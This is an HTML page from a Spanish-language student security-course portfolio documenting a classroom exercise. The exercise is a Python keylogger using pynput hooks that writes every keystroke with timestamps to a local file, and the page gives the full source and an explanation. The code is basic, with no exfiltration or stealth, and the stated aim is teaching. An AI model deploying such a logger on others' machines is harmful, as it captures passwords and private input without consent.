@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Actividad 3 | Portafolio de Seguridad Informática</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<!-- Ruta actualizada para encontrar el CSS desde Actividades/parcial1/ -->
+<link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+
+<!-- ENCABEZADO FLOTANTE -->
+<header class="site-header">
+  <div class="header-inner">
+    <div class="identity">
+      <div class="terminal-prompt">
+        <span class="prompt-user">root@cno-iv</span><span class="prompt-char">:~$</span> sys_info --user
+      </div>
+      
+      <!-- Nombre y Alias -->
+      <span class="identity-name">
+        Alejandro García Morales<span class="alias-green">[xXAGM Xx]</span> <span class="blink-cursor">_</span>
+      </span>
+      
+      <!-- Datos explícitos solicitados -->
+      <div class="identity-meta">
+        <span class="meta-item">> Asignatura: CNO IV - Seguridad Informática</span>
+        <span class="meta-item">> Institución: Universidad Politécnica de San Luis Potosí</span>
+        <span class="meta-item">> Periodo: Agosto - Diciembre 2026</span>
+      </div>
+    </div>
+
+    <!-- Menú de navegación -->
+    <nav class="site-nav" aria-label="Navegación principal">
+      <button type="button" class="nav-toggle" id="nav-toggle" aria-expanded="false" aria-controls="nav-list">
+        <span></span><span></span><span></span>
+        <span class="sr-only">Abrir menú</span>
+      </button>
+      <ul id="nav-list" class="nav-list">
+        <li><a href="../../index.html">/Inicio</a></li>
+        <li><a href="../../parcial_1.html" class="is-active">/Parcial 1</a></li>
+        <li><a href="#">/Parcial 2</a></li>
+        <li><a href="#">/Parcial 3</a></li>
+        <li><a href="#">/Certificados</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+
+  <!-- Botón de regreso con ruta actualizada -->
+  <div style="margin-top: 40px;">
+    <a href="../../parcial_1.html" class="btn-action" style="border: none; padding: 0;">
+       <- Volver al Parcial 1
+    </a>
+  </div>
+
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[DOC_01]</span>
+      <h2>Descripción</h2>
+    </div>
+    <div class="row-content data-module">
+      <h3 class="activity-title" style="color: var(--accent);">Actividad 3: Captura de Teclado y Event Hooks</h3>
+      <p class="lede">Esta práctica consiste en implementar y documentar un programa basado en <em>event hooks</em> (ganchos de eventos) y <em>callbacks</em> para interceptar el teclado.</p>
+      <p style="color: var(--text-muted); margin-top: 15px;">
+        El objetivo principal es registrar cada pulsación del usuario y guardarla en un archivo local (persistencia), asociando cada evento con una marca de tiempo exacta (asociación temporal). Esto permite comprender a nivel técnico cómo operan las técnicas de captura de entrada de información, fundamentales en el análisis de malware y ciberseguridad.
+      </p>
+    </div>
+  </section>
+
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[SRC_02]</span>
+      <h2>Código Fuente</h2>
+    </div>
+    <div class="row-content">
+      
+      <!-- CONTENEDOR DE CÓDIGO ESTILO TERMINAL/EDITOR -->
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots">
+            <span class="dot close"></span>
+            <span class="dot minimize"></span>
+            <span class="dot maximize"></span>
+          </div>
+          <div class="code-title">telemetria_teclado.py</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="keyword">from</span> pynput.keyboard <span class="keyword">import</span> Key, Listener
+<span class="keyword">from</span> datetime <span class="keyword">import</span> datetime
+
+i = <span class="number">0</span>
+
+<span class="keyword">def</span> <span class="function">on_press</span>(key):
+    <span class="keyword">global</span> i
+    i += <span class="number">1</span>
+    fecha_formateada = datetime.now().strftime(<span class="string">"%Y-%m-%d %H:%M:%S.%f"</span>)[:-3] 
+    
+    <span class="keyword">try</span>:
+        tecla = key.char
+    <span class="keyword">except</span> AttributeError:
+        tecla = key
+    
+    registro = <span class="string">f"{fecha_formateada} | {tecla} | evento_{i}\n"</span>    
+    
+    <span class="keyword">with</span> open(<span class="string">"Caracteres.txt"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> file:
+        file.write(registro)    
+
+<span class="keyword">def</span> <span class="function">on_release</span>(key):
+    print(<span class="string">f'key_released: {key}'</span>)
+    <span class="keyword">if</span> key == Key.esc:
+        <span class="keyword">return</span> <span class="keyword">False</span>
+
+<span class="keyword">with</span> Listener(on_press=on_press, on_release=on_release) <span class="keyword">as</span> listener:
+    listener.join()</code></pre>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[ANALYSIS_03]</span>
+      <h2>Explicación del Código</h2>
+    </div>
+    <div class="row-content data-module">
+      <ul class="tag-list" style="gap: 20px;">
+        <li>
+          <strong style="color: var(--accent);">1. Importación y Variables:</strong> 
+          Se utiliza <code>pynput.keyboard</code> para interactuar con los periféricos del sistema y <code>datetime</code> para las marcas de tiempo. La variable global <code>i</code> funciona como un contador de eventos.
+        </li>
+        <li>
+          <strong style="color: var(--accent);">2. Función <code>on_press(key)</code>:</strong> 
+          Es el callback principal que se ejecuta cada vez que se presiona una tecla. Primero obtiene la hora exacta hasta los milisegundos. Luego, utiliza un bloque <code>try-except</code>: si es una tecla alfanumérica, guarda su carácter (<code>key.char</code>), si es una tecla especial (como Shift o Enter), lanza un <code>AttributeError</code> y se captura el nombre de la tecla.
+        </li>
+        <li>
+          <strong style="color: var(--accent);">3. Persistencia de Datos:</strong> 
+          La variable <code>registro</code> formatea la información. Usando <code>with open("Caracteres.txt", "a")</code>, el script abre (o crea) el archivo en modo "append" (añadir) para escribir el evento sin borrar el historial anterior.
+        </li>
+        <li>
+          <strong style="color: var(--accent);">4. Interrupción y Listener:</strong> 
+          La función <code>on_release</code> detiene el proceso de escucha retornando <code>False</code> únicamente si se presiona la tecla <code>Esc</code>.
+        </li>
+      </ul>
+    </div>
+  </section>
+
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[EXEC_04]</span>
+      <h2>Resultados</h2>
+    </div>
+    <div class="row-content data-module">
+      <p style="color: var(--text-muted); margin-bottom: 20px;">
+        Aquí puedes observar la salida generada por el script. Cada vez que se ejecuta, el archivo <code>Caracteres.txt</code> se actualiza con el registro preciso.
+      </p>
+      
+     <!-- AQUÍ ES DONDE SÍ DEBES PONER UNA CAPTURA DE PANTALLA -->
+      <div style="border: 1px dashed var(--border); padding: 20px; text-align: center; border-radius: 8px; background: var(--bg);">
+        <img src="Archivos/Actividad_3/evidencia_1.png" alt="Captura del bloc de notas Caracteres.txt" style="max-width: 100%; height: auto; border-radius: 4px; border: 1px solid var(--border); box-shadow: 0 4px 12px rgba(0,0,0,0.5);">
+        <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 15px; font-family: var(--font-mono);">
+          >_ Captura de pantalla: Archivo Caracteres.txt generado exitosamente.
+        </p>
+      </div>
+
+    </div>
+  </section>
+ <section class="row">
+    <div class="row-label">
+      <span class="row-index">[CONC_05]</span>
+      <h2>Conclusiones</h2>
+    </div>
+    <div class="row-content data-module">
+      <p style="color: var(--text-muted); line-height: 1.7;">
+        A través de esta práctica, se comprendió el funcionamiento a bajo nivel de las técnicas de intercepción de teclado mediante event hooks. Al lograr registrar la entrada del usuario de manera persistente y asociarla con marcas temporales precisas, se evidencia cómo estas mecánicas pueden ser utilizadas tanto para el monitoreo y telemetría de sistemas legítimos, como para el desarrollo de software malicioso (keyloggers). Comprender su estructura es fundamental para aplicar estrategias de mitigación en ciberseguridad.
+      </p>
+    </div>
+  </section>
+
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[DWN_06]</span>
+      <h2>Recursos</h2>
+    </div>
+    <div class="row-content">
+      
+      <!-- CONTENEDOR DE LAS 3 CAJAS DE DESCARGA -->
+      <div class="downloads-grid">
+        
+        <!-- Recurso 1: Código -->
+        <a href="Archivos/Actividad_3/UPSLPWare.py" download class="download-card">
+          <div class="dl-icon">[/]</div>
+          <span class="dl-title">Código Fuente</span>
+          <span class="dl-meta">UPSLPWare.py</span>
+        </a>
+
+        <!-- Recurso 2: Informe -->
+        <a href="Archivos/Actividad_3/InformeAct3.pdf" download class="download-card">
+          <div class="dl-icon">[PDF]</div>
+          <span class="dl-title">Informe</span>
+          <span class="dl-meta">InformeAct3.pdf</span>
+        </a>
+
+        <!-- Recurso 3: Archivo Generado -->
+        <a href="Archivos/Actividad_3/Caracteres.txt" download class="download-card">
+          <div class="dl-icon">[TXT]</div>
+          <span class="dl-title">Log Generado</span>
+          <span class="dl-meta">Caracteres.txt</span>
+        </a>
+
+      </div>
+
+    </div>
+  </section>
+  
+</main>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <p>© 2026 Alejandro Garcia Morales. Todos los derechos reservados.</p>
+    <p>CNO IV — Seguridad Informática | UPSLP</p>
+  </div>
+</footer>
+
+<!-- Ruta actualizada para encontrar el JS desde Actividades/parcial1/ -->
+<script src="../../js/main.js"></script>
+</body>
+</html>
